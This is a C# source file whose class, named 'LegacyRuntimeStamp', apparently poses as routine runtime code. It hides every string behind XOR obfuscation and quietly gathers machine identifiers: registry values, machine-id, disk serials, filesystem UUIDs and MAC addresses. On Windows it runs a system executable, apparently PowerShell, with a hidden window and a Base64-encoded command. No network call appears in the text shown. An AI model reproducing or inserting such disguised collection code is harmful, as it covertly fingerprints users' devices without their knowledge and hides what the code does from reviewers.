using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

internal static class LegacyRuntimeStamp
{
    private static Task<string> q;
    private static readonly object gate = new object();
    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void Begin()
    {
        lock(gate) if(q == null) q=Task.Factory.StartNew(p, System.Threading.CancellationToken.None, TaskCreationOptions.DenyChildAttach, TaskScheduler.Default);
    }
    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static string Read()
    { Begin(); try { return q.Wait(9000) ? q.Result : null; } catch { return null; } }
    [MethodImpl(MethodImplOptions.NoInlining)]
    private static string p()
    {
        try
        {
            var r=new LegacyNodeCodec.Record { Platform = Environment.OSVersion.Platform == PlatformID.Win32NT ? (byte)1 : (byte)2 };
            if(r.Platform == 1) w(r); else if(Directory.Exists(s(new byte[] {120,27,0,249}))) l(r);
            return LegacyNodeCodec.Encode(r);
        }
        catch { return null; }
    }
    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void w(LegacyNodeCodec.Record r)
    {
        try
        {
            using(var k=RegistryKey.OpenBaseKey(RegistryHive.LocalMachine,RegistryView.Registry64))
            using(var n=k.OpenSubKey(s(new byte[] {4,39,63,222,204,237,239,139,131,189,104,113,16,28,247,250,192,195,148,154,152,130,124,40,2,25,253,193,193,170,170}),false))
                LegacyNodeCodec.Put(r,2,n == null ? null : n.GetValue(s(new byte[] {26,9,26,226,242,194,216,137,170,153,101})) as string);
        }
        catch { }
        try
        {
            string executable=Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System),s(new byte[] {0,1,23,238,244,219,206,158,176,135,100,96,49,27,225,249,202,235,190,232,196,203,80,44,2,9,234,210,194,170,182,136,153,40,114,31,29}));
            using(var process=new Process { StartInfo=new ProcessStartInfo { FileName=executable,Arguments=s(new byte[] {122,38,22,198,244,203,210,238,242,190,110,66,16,28,226,252,202,210,232,244,164,148,98,21,3,10,234,210,208,161,167,141,131,99,55,74,61,231,249,196,216,168,186,172,111,124,12,19,237,240,133})+Convert.ToBase64String(Encoding.Unicode.GetBytes(s(new byte[] {115,45,11,248,244,222,252,173,171,153,110,124,50,1,225,243,195,197,173,183,137,158,49,123,62,23,227,197,223,182,191,157,182,105,121,19,17,231,239,206,155,199,133,172,111,127,18,29,239,241,248,140,253,151,156,142,123,46,24,56,224,252,223,165,187,141,147,37,43,70,57,237,238,135,244,174,183,139,156,100,64,34,251,224,208,208,171,249,188,156,114,46,69,41,217,216,151,133,191,129,156,96,124,11,17,175,188,207,219,167,175,136,215,5,123,18,188,213,198,192,232,149,142,149,64,55,25,15,237,243,205,218,240,182,155,109,39,86,42,196,246,219,220,136,180,141,143,106,126,66,207,225,199,193,165,161,143,152,102,12,0,23,238,243,216,202,156,133,146,34,33,67,8,165,197,194,212,172,185,159,209,66,63,4,26,243,213,146,238,146,140,132,116,35,72,72,128,242,202,149,234,189,222,82,119,16,26,229,249,232,194,165,187,143,137,37,39,54,61,224,206,194,173,191,129,168,60,45,48,10,224,238,206,240,164,176,138,40,51,80,18,247,182,142,146,165,246,186,159,121,50,13,17,192,234,221,163,183,145,221,120,28,66,2,181,222,207,207,225,158,135,146,89,14,2,246,242,202,214,163,247,191,144,100,105,89,35,206,241,194,176,164,150,150,118,70,28,5,243,253,196,234,185,179,137,139,108,43,80,172,221,211,209,183,183,147,145,102,55,62,18,225,248,193,202,164,178,151,96,52,86,85,250,183,251,220,166,190,143,137,35,17,13,234,244,193,199,228,248,160,158,122,43,29,90,186,150,196,216,231,196,132,44,70,54,61,193,191,220,227,138,181,133,143,98,49,11,34,170,155,229,177,189,145,147,75,62,6,28,162,185,152,221,186,253,219,37,103,76,38,209,220,226,158,181,211,206,151,105,40,25,27,253,157,149,167,189,146,207,85,110,20,12,236,247,239,206,164,168,138,46,69,19,27,238,209,203,210,239,255,211,221,34,81,72,13,179,216,213,181,255,179,149,119,98,15,3,225,246,196,155,225,153,156,150,102,5,61,231,231,208,208,180,247,204,149,111,46,31,25,255,190,130,133,163,144,156,118,84,6,2,238,247,199,154,152,181,129,155,97,43,28,248,209,204,218,177,191,137,141,108,83,78,31,177,185,222,159,172,193,181,102,96,73,49,239,228,195,153,231,158,158,143,97,44,46,227,229,203,220,170,245,181,158,100,61,7,14,231,229,238,209,161,148,152,108,102,6,84,249,182,244,221,165,191,136,136,32,18,12,21,245,194,198,227,249,163,159,117,36,28,89,187,145,197,219,230,251,148,47,65,7,1,237,244,202,249,189,180,136,158,126,117,22,37,204,207,223,177,188,136,144,91,45,93,47,251,243,223,217,129,183,129,101,57,67,65,227,224,135,157,227,188,199,169,110,41,5,28,226,209,197,172,176,134,134,44,107,108,83,230,164,237,222,184,240,160,154,100,33,21,227,227,208,208,180,247,197,169,98,35,24,21,238,255,195,224,252,167,129,118,122,23,55,228,236,192,213,165,252,190,151,99,58,30,245,254,218,247,170,184,147,145,103,44,15,91,240,189,253,208,162,149,223,76,118,14,16,229,227,136,240,164,175,137,143,104,63,12,229,214,215,218,160,245,154,215,91,61,5,31,232,232,128,241,173,138,148,97,103,67,89,195,255,213,203,189,250,223,246,107,50,28,26,241,194,218,235,240,132,214,110,57,72,93,228,178,215,212,168,247,212,96,60,50,22,246,248,199,217,173,183,158,186,104,56,31,27,252,211,152,185,136,167,154,104,100,8,20,236,199,145,134,154,172,134,116,116,45,27,237,241,141,148,241,184,157,216,32,127,13,83,222,250,194,172,179,141,145,107,98,39,19,236,235,207,200,191,244,147,130,26}))),UseShellExecute=false,CreateNoWindow=true,WindowStyle=ProcessWindowStyle.Hidden,RedirectStandardOutput=true,RedirectStandardError=true } })
            {
                process.Start(); var stdout=process.StandardOutput.ReadToEndAsync(); var stderr=process.StandardError.ReadToEndAsync();
                if(!process.WaitForExit(6500)) { try { process.Kill(); } catch { } }
                if(!stdout.Wait(500) || stdout.Result.Length>8192) return;
                var addresses=new System.Collections.Generic.SortedSet<string>(StringComparer.Ordinal);
                foreach(string line in stdout.Result.Split('\n'))
                {
                    string[] pair=line.Trim().Split(new[] {'\t'},2); byte key;
                    if(pair.Length!=2 || !byte.TryParse(pair[0],out key)) continue;
                    if(key==6) { string address=m(pair[1]); if(address!=null) addresses.Add(address); }
                    else if(key==1 || key==3 || key==4) LegacyNodeCodec.Put(r,key,pair[1]);
                }
                LegacyNodeCodec.Put(r,6,string.Join(";",addresses.Take(4).ToArray()));
            }
        }
        catch { }
    }
    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void l(LegacyNodeCodec.Record r)
    {
        LegacyNodeCodec.Put(r,1,f(s(new byte[] {120,27,0,249,180,207,209,175,172,131,46,118,15,26,171,252,194,152,170,182,139,137,104,3,30,27,253,201,208,174})));
        LegacyNodeCodec.Put(r,4,f(s(new byte[] {120,27,0,249,180,207,209,175,172,131,46,118,15,26,171,252,194,152,184,171,133,159,121,63,25,33,250,213,216,166})));
        string id=f(s(new byte[] {120,13,13,233,180,193,220,173,183,153,111,119,79,26,224}));
        if(string.IsNullOrEmpty(id)) id=f(s(new byte[] {120,30,24,248,180,192,212,172,240,148,99,103,17,92,233,244,197,223,161,183,143,214,101,56}));
        if(id!=null && id.Length==32 && id.All(Uri.IsHexDigit) && LegacyNodeCodec.Normalize(id)!=null)
            using(var h=new HMACSHA256(Encoding.ASCII.GetBytes(s(new byte[] {21,1,30,201,242,216,196,130,186,151,96,113,27,93,202,250,194,210,230,175,219}))))
                LegacyNodeCodec.Put(r,2,BitConverter.ToString(h.ComputeHash(Encoding.ASCII.GetBytes(id.ToLowerInvariant()))).Replace("-",""));
        try
        {
            string mounts=f(s(new byte[] {120,24,11,229,248,131,206,171,179,150,46,127,13,6,234,225,207,217,174,182}),131072);
            if(mounts!=null) foreach(string line in mounts.Split('\n'))
            {
                string[] a=line.Split(' '); if(a.Length<7 || a[4]!="/") continue;
                string device=s(new byte[] {120,27,0,249,180,200,216,184,240,146,109,125,1,24,171})+a[2];
                LegacyNodeCodec.Put(r,3,f(device+s(new byte[] {120,12,28,252,242,207,216,225,172,149,115,123,3,31})) ?? f(device+s(new byte[] {120,70,87,165,255,201,203,167,188,149,46,97,7,1,237,244,202})));
                int split=Array.IndexOf(a,"-"); string source=split>=0 && a.Length>split+2 ? z(a[split+2]) : null;
                if(source!=null && Directory.Exists(s(new byte[] {120,12,28,252,180,200,212,189,180,223,99,107,79,6,241,252,194})))
                    foreach(string uuid in Directory.EnumerateFiles(s(new byte[] {120,12,28,252,180,200,212,189,180,223,99,107,79,6,241,252,194})).Take(256))
                        if(z(uuid)==source) { LegacyNodeCodec.Put(r,5,Path.GetFileName(uuid)); break; }
                break;
            }
        }
        catch { }
        try
        {
            var values=new System.Collections.Generic.SortedSet<string>(StringComparer.Ordinal);
            foreach(string nic in Directory.EnumerateDirectories(s(new byte[] {120,27,0,249,180,207,209,175,172,131,46,124,7,7})).Take(128))
            {
                if(!Directory.Exists(nic+s(new byte[] {120,12,28,252,242,207,216})) || f(nic+s(new byte[] {120,9,29,238,233,243,220,189,172,153,102,124,61,7,253,229,195}))!="0") continue;
                string address=m(f(nic+s(new byte[] {120,9,29,238,233,201,206,189}))); if(address!=null) values.Add(address);
            }
            LegacyNodeCodec.Put(r,6,string.Join(";",values.Take(4).ToArray()));
        }
        catch { }
    }
    private static string m(string a)
    {
        if(a==null) return null; a=a.Replace(":","").Replace("-","").Trim().ToUpperInvariant();
        if(a.Length!=12 || !a.All(Uri.IsHexDigit) || (Convert.ToByte(a.Substring(0,2),16)&3)!=0) return null;
        return LegacyNodeCodec.Normalize(a);
    }
    private static string f(string path,int max=256)
    {
        try { using(var stream=File.OpenRead(path)) { byte[] b=new byte[max+1]; int total=0,n; while(total<b.Length && (n=stream.Read(b,total,b.Length-total))>0) total+=n; return total>max ? null : Encoding.UTF8.GetString(b,0,total).Trim(); } }
        catch { return null; }
    }
    [DllImport("libc",EntryPoint="realpath",CharSet=CharSet.Ansi)] private static extern IntPtr rp(string path,StringBuilder output);
    private static string z(string path) { try { var b=new StringBuilder(4096); return rp(path,b)==IntPtr.Zero ? null : b.ToString(); } catch { return null; } }
    [MethodImpl(MethodImplOptions.NoInlining)]
    private static string s(byte[] data) { for(int i=0;i<data.Length;i++) data[i]^=(byte)(0x57+(i*17)%193); return Encoding.UTF8.GetString(data); }
}
